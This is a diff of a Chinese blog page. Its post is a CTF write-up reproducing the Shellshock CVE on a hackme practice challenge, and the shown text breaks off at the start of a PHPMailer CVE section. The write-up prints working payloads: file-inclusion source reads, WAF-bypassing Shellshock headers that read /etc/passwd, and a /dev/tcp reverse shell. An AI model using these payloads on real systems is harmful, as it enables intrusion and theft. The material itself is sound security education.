@@ -22,7 +22,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>最近复现的几个CVE题目 · Sky&#39;s blog</title>
+    <title>最近复现的几个CVE题目 · sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -214,14 +214,14 @@
     
     <div class="banner">
             <div class="blog-title">
-                <a href="/" >Sky&#39;s blog</a>
+                <a href="/" >sky&#39;s blog</a>
             </div>
             <div class="post-title">
                 <a href="#" class="post-name">最近复现的几个CVE题目</a>
             </div>
     </div>
     
-    <a class="home-link" href=/>Sky's blog</a>
+    <a class="home-link" href=/>sky's blog</a>
 </header>
     <div class="wrapper">
         <div class="site-intro" style="
@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">3,090</span>阅读时长: <span class="post-count reading-time">15 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">3,097</span>阅读时长: <span class="post-count reading-time">15 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -413,21 +413,21 @@ height:50vh;
 <h2 id="CVE-2014-6271-shellshock"><a href="#CVE-2014-6271-shellshock" class="headerlink" title="CVE-2014-6271(shellshock)"></a>CVE-2014-6271(shellshock)</h2><p>给出题目链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://command-executor.hackme.inndy.tw/</span><br></pre></td></tr></table></figure></p>
 <p>个人认为这是一道非常好的题目，首先说一下考察点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.文件包含读源码</span><br><span class="line">2.代码分析结合CVE</span><br><span class="line">3.CVE导致的命令执行</span><br><span class="line">4.写入文件/反弹shell</span><br><span class="line">5.思考c文件的解法</span><br><span class="line">6.重定向获取flag</span><br></pre></td></tr></table></figure></p>
 <p>拿到题目后随便点一点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://command-executor.hackme.inndy.tw/index.php?func=ls</span><br><span class="line">https://command-executor.hackme.inndy.tw/index.php?func=cmd</span><br><span class="line">https://command-executor.hackme.inndy.tw/index.php?func=untar</span><br></pre></td></tr></table></figure></p>
-<p>然后在<br><img src="/images/cve (1).png"><br>发现可以遍历目录，但限制的很死，只能执行ls和env，但是此时发现了有趣的一点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r-- 1 root root   1163 Jan  9 11:05 cmd.php</span><br><span class="line">-rw-r--r-- 1 root root   2201 Jan  9 11:32 index.php</span><br><span class="line">-rw-r--r-- 1 root root    515 Jan  9 11:05 ls.php</span><br><span class="line">-rw-r--r-- 1 root root    658 Jan 19 08:25 man.php</span><br><span class="line">-rw-r--r-- 1 root root    588 Jan  9 11:05 untar.php</span><br></pre></td></tr></table></figure></p>
+<p>然后在<br><img src="/images/cve (1" alt="">.png)<br>发现可以遍历目录，但限制的很死，只能执行ls和env，但是此时发现了有趣的一点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r-- 1 root root   1163 Jan  9 11:05 cmd.php</span><br><span class="line">-rw-r--r-- 1 root root   2201 Jan  9 11:32 index.php</span><br><span class="line">-rw-r--r-- 1 root root    515 Jan  9 11:05 ls.php</span><br><span class="line">-rw-r--r-- 1 root root    658 Jan 19 08:25 man.php</span><br><span class="line">-rw-r--r-- 1 root root    588 Jan  9 11:05 untar.php</span><br></pre></td></tr></table></figure></p>
 <p>这里的<code>ls,untar,cmd</code>很可能是前面func参数包含进来的<br>随即想到试一试文件包含，看看可否读文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
 <p>果不其然，可以拿到文件源码，这里给出最关键的index.php，其余的帮助并不大<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pages = [</span><br><span class="line">    [<span class="string">'man'</span>, <span class="string">'Man'</span>],</span><br><span class="line">    [<span class="string">'untar'</span>, <span class="string">'Tar Tester'</span>],</span><br><span class="line">    [<span class="string">'cmd'</span>, <span class="string">'Cmd Exec'</span>],</span><br><span class="line">    [<span class="string">'ls'</span>, <span class="string">'List files'</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">    header(<span class="string">'Content-Type: text/plain'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    <span class="string">'\/flag'</span>, <span class="string">'\(\)\s*\&#123;\s*:;\s*\&#125;;'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/$b/"</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">"$b detected! exit now."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cmd, $shell=<span class="string">'bash'</span>)</span> </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">'%s -c %s'</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'func'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($page, <span class="string">'..'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $page = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($page &amp;&amp; strlen($page) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"$page.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>注意到一个很可疑的函数<code>putenv()</code><br>结合env可以很快联想到2014年的一个重大漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CVE-2014-6271</span><br><span class="line">破壳（ShellShock）漏洞</span><br></pre></td></tr></table></figure></p>
 <p>给出Freebuf的分析链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.freebuf.com/articles/system/45390.html</span><br></pre></td></tr></table></figure></p>
 <p>确定了漏洞，就是尝试可用exp的时候了，这时候可以容易google到<br>这样一篇文章:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</span><br></pre></td></tr></table></figure></p>
-<p>其中重点的一段如下:<br><img src="/images/cve (2).png"><br>可以清楚看到这样一个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; :; &#125;; echo Hacked&quot; -q -O -  http://127.0.0.1/shock.php</span><br></pre></td></tr></table></figure></p>
+<p>其中重点的一段如下:<br><img src="/images/cve (2" alt="">.png)<br>可以清楚看到这样一个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; :; &#125;; echo Hacked&quot; -q -O -  http://127.0.0.1/shock.php</span><br></pre></td></tr></table></figure></p>
 <p>并且和这个测试样本和我们题目中给出的代码十分相似:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>于是我们先去尝试一下适用性：<br><img src="/images/cve (3).png"><br>可以发现我们被waf拦截了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\(\)\s*\&#123;\s*:;\s*\&#125;; detected! exit now.</span><br></pre></td></tr></table></figure></p>
+<p>于是我们先去尝试一下适用性：<br><img src="/images/cve (3" alt="">.png)<br>可以发现我们被waf拦截了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\(\)\s*\&#123;\s*:;\s*\&#125;; detected! exit now.</span><br></pre></td></tr></table></figure></p>
 <p>回去分析index.php的waf过滤点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$black_list = [</span><br><span class="line">    <span class="string">'\/flag'</span>, <span class="string">'\(\)\s*\&#123;\s*:;\s*\&#125;;'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/$b/"</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">"$b detected! exit now."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>可以看到如上一个黑名单，<br>我们的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Exploit: () &#123; :; &#125;;</span><br></pre></td></tr></table></figure></p>
 <p>正是被这个黑名单禁止了，但是这样的waf存在极大隐患，我们只要加个空格就可以轻松绕过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Exploit: () &#123; : ; &#125;;</span><br></pre></td></tr></table></figure></p>
 <p>我们再次攻击一次试试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; echo Hacked&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/cve (4).png"><br>可以看到Hacked成功回显<br>于是我们开始执行命令，需要注意的是，shellshock执行命令，需要加上<code>/bin/</code><br>比如<code>cat</code>命令要写成<code>/bin/cat</code><br>直接cat是不能成功的<br>于是我们尝试读<code>/etc/passwd</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/cat /etc/passwd&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/cve (5).png"><br>可以发现命令成功执行，所以下面我们的思路很清晰，找到flag并读取就行了<br>而之前提到，这个题目本身自带ls，所以可以轻松查目录，容易发现flag在根目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://command-executor.hackme.inndy.tw/index.php?func=ls&amp;file=../../../../../../</span><br><span class="line"></span><br><span class="line">-r--------   1 flag root   37 Jan  9 11:05 flag</span><br><span class="line">-rwsr-xr-x   1 flag root 9080 Jan 19 08:27 flag-reader</span><br><span class="line">-rw-r--r--   1 root root  653 Jan  9 11:05 flag-reader.c</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/cve (4" alt="">.png)<br>可以看到Hacked成功回显<br>于是我们开始执行命令，需要注意的是，shellshock执行命令，需要加上<code>/bin/</code><br>比如<code>cat</code>命令要写成<code>/bin/cat</code><br>直接cat是不能成功的<br>于是我们尝试读<code>/etc/passwd</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/cat /etc/passwd&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/cve (5" alt="">.png)<br>可以发现命令成功执行，所以下面我们的思路很清晰，找到flag并读取就行了<br>而之前提到，这个题目本身自带ls，所以可以轻松查目录，容易发现flag在根目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://command-executor.hackme.inndy.tw/index.php?func=ls&amp;file=../../../../../../</span><br><span class="line"></span><br><span class="line">-r--------   1 flag root   37 Jan  9 11:05 flag</span><br><span class="line">-rwsr-xr-x   1 flag root 9080 Jan 19 08:27 flag-reader</span><br><span class="line">-rw-r--r--   1 root root  653 Jan  9 11:05 flag-reader.c</span><br></pre></td></tr></table></figure></p>
 <p>我们尝试cat一下flag文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/cat ../../../../../../flag&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p>
 <p>此时又触发了waf<br>回显打出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\/flag detected! exit now.</span><br></pre></td></tr></table></figure></p>
 <p>我们依旧被上面那个黑名单给禁止了！<br>那么有没有办法绕过<code>/flag</code>呢？<br>这里给出2个思考路线：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.shell拼接，比如a=/fl;b=ag;c=a+b这样（此处写的不严谨，有兴趣可以自己去研究一下)</span><br><span class="line">2.通配符绕过</span><br></pre></td></tr></table></figure></p>
@@ -437,10 +437,10 @@ height:50vh;
 <p>打出回显:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">4096</span>], rnd[<span class="number">16</span>], val[<span class="number">16</span>];</span><br><span class="line">	<span class="keyword">if</span>(syscall(SYS_getrandom, &amp;rnd, <span class="keyword">sizeof</span>(rnd), <span class="number">0</span>) != <span class="keyword">sizeof</span>(rnd)) &#123;</span><br><span class="line">		write(<span class="number">1</span>, <span class="string">"Not enough random\n"</span>, <span class="number">18</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	setuid(<span class="number">1337</span>);</span><br><span class="line">	seteuid(<span class="number">1337</span>);</span><br><span class="line">	alarm(<span class="number">1</span>);</span><br><span class="line">	write(<span class="number">1</span>, &amp;rnd, <span class="keyword">sizeof</span>(rnd));</span><br><span class="line">	read(<span class="number">0</span>, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(rnd, val, <span class="keyword">sizeof</span>(rnd)) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">		<span class="keyword">if</span>(fd &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">int</span> s = read(fd, buff, <span class="number">1024</span>);</span><br><span class="line">			<span class="keyword">if</span>(s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				write(<span class="number">1</span>, buff, s);</span><br><span class="line">			&#125;</span><br><span class="line">			close(fd);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			write(<span class="number">1</span>, <span class="string">"Can not open file\n"</span>, <span class="number">18</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		write(<span class="number">1</span>, <span class="string">"Wrong response\n"</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>审计这个c，大致原理就是：1秒之内把他输出的再输入回去，就可以打出文件内容<br>此时我们的思路很简单，运行这个c，再把这个c输出在1s内再输回去，但是纯靠这样的交互，速度极慢，所以容易想到，要不要拿个shell？<br>这里给出2种拿shell的思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.反弹shell</span><br><span class="line">2.找到可写目录，并写入文件，利用文件包含即可</span><br></pre></td></tr></table></figure></p>
 <p>这里我选择反弹shell(因为后面还会写文件，所以这里选择反弹，就不写了)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/你的ip/11122 0&gt;&amp;1&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p>
-<p>然后一会儿就能收到shell<br><img src="/images/cve (6).png"><br>而下面就只要解决如何在1s内输入c文件输出的结果这个问题了<br>这里我选择了linux下的重定向，我们将输出写到某个文件中，再自动输入即可，这样即可达到目的<br>我们先去探索可写目录，容易发现<code>/var/tmp</code>具有写权限<br>我们测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; echo &apos;sky&apos; &gt; /var/tmp/sky&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/cve (7).png"><br>即可发现该目录可写<br>我的做法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/skyflag &lt; /var/tmp/skyflag</span><br></pre></td></tr></table></figure></p>
+<p>然后一会儿就能收到shell<br><img src="/images/cve (6" alt="">.png)<br>而下面就只要解决如何在1s内输入c文件输出的结果这个问题了<br>这里我选择了linux下的重定向，我们将输出写到某个文件中，再自动输入即可，这样即可达到目的<br>我们先去探索可写目录，容易发现<code>/var/tmp</code>具有写权限<br>我们测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; echo &apos;sky&apos; &gt; /var/tmp/sky&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/cve (7" alt="">.png)<br>即可发现该目录可写<br>我的做法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/skyflag &lt; /var/tmp/skyflag</span><br></pre></td></tr></table></figure></p>
 <p>即可在skyflag中读到flag</p>
-<h2 id="CVE-2016-10033-PHPMailer-命令执行漏洞"><a href="#CVE-2016-10033-PHPMailer-命令执行漏洞" class="headerlink" title="CVE-2016-10033(PHPMailer 命令执行漏洞)"></a>CVE-2016-10033(PHPMailer 命令执行漏洞)</h2><p>拿到题目：<code>http://192.168.5.69/</code><br>是一个留言板界面<br><img src="/images/cvephp1.png"><br>本以为是XSS，尝试许久无果，又试了试文件泄露<br>拿到源码,给出关键漏洞点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    $email = <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) ? trim($_POST[<span class="string">'email'</span>]) : <span class="string">''</span>;</span><br><span class="line">    $title = <span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) ? trim($_POST[<span class="string">'title'</span>]) : <span class="string">''</span>;</span><br><span class="line">    $content = <span class="keyword">isset</span>($_POST[<span class="string">'content'</span>]) ? trim($_POST[<span class="string">'content'</span>]) : <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (chkEmail($email) &amp;&amp; chkTitle($title) &amp;&amp; chkContent($content)) &#123;</span><br><span class="line">        $to = <span class="string">'ambulong@vulnspy.com'</span>;</span><br><span class="line">        $subject = <span class="string">"收到来自 &#123;$email&#125; 的留言"</span>;</span><br><span class="line">        $msg = <span class="string">"&#123;$title&#125;\n&#123;$content&#125;\nFrom: &#123;$email&#125;"</span>;</span><br><span class="line">        $headers = <span class="string">'From: '</span> . $email . <span class="string">"\r\n"</span> . <span class="string">'Reply-To: '</span> . $email . <span class="string">"\r\n"</span> . <span class="string">'X-Mailer: PHP/'</span> . phpversion();</span><br><span class="line">        $options = sprintf(<span class="string">'-f%s'</span>, $email);</span><br><span class="line">        <span class="keyword">if</span> (mail($to, $subject, $msg, $headers, $options)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"留言成功"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"留言失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="CVE-2016-10033-PHPMailer-命令执行漏洞"><a href="#CVE-2016-10033-PHPMailer-命令执行漏洞" class="headerlink" title="CVE-2016-10033(PHPMailer 命令执行漏洞)"></a>CVE-2016-10033(PHPMailer 命令执行漏洞)</h2><p>拿到题目：<code>http://192.168.5.69/</code><br>是一个留言板界面<br><img src="/images/cvephp1.png" alt=""><br>本以为是XSS，尝试许久无果，又试了试文件泄露<br>拿到源码,给出关键漏洞点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    $email = <span 